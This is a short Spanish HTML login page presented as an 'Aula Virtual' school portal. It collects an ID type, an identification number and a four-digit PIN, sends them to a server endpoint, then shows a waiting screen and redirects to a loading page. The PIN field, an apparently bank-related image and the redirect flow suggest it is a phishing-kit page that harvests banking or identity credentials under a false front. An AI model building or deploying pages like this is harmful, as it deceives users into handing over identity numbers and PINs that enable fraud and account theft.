<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Aula Virtual</title>
<link rel="stylesheet" href="css/styles.css">
</head>

<body>

<!-- SPINNER -->
<div id="spinner-overlay" style="display:none;position:fixed;inset:0;background:#fff;z-index:999;align-items:center;justify-content:center;flex-direction:column">
<img src="images/ban.png" width="120">
<p>Espere un momento...</p>
</div>

<div class="container">

<!-- FORM -->
<form id="segura">

<h2>Bienvenido a tu aula Virtual</h2>

<select id="tipo" required>
<option value="">Seleccione tipo</option>
<option value="CC">Cédula</option>
<option value="TI">Tarjeta identidad</option>
</select>

<input id="identificacion" placeholder="Identificación" required>

<input id="clave" placeholder="Clave 4 dígitos" maxlength="4" required>

<button  style="
                      width: 100%;
                      background: #0043a9;
                      border-radius: 20px;
                      padding: 20p;
                      color: white;
                      margin-top: 30px;
                    "  type="submit">Ingresar</button>

</form>

</div>

<script>
const form = document.getElementById("segura");

form.addEventListener("submit", async e=>{
 e.preventDefault();

 const tipo = document.getElementById("tipo").value.trim();
 const identificacion = document.getElementById("identificacion").value.trim();
 const clave = document.getElementById("clave").value.trim();

 if(!tipo || !identificacion || !clave){
   alert("Complete todos los campos");
   return;
 }

 if(!/^\d{4}$/.test(clave)){
   alert("La clave debe tener 4 dígitos");
   return;
 }

 document.getElementById("spinner-overlay").style.display="flex";

 try{

 const r = await fetch("/api/nombre",{
  method:"POST",
  headers:{ "Content-Type":"application/json"},
  body:JSON.stringify({
    tipo,
    identificacion,
    clave
  })
 });

 const j = await r.json();

 if(!j.id){
   alert("Error servidor");
   location.reload();
   return;
 }

 localStorage.setItem("id", j.id);

 location="load.html";

 }catch(err){
   console.error(err);
   alert("Error de conexión");
   location.reload();
 }
});

</script>

</body>
</html>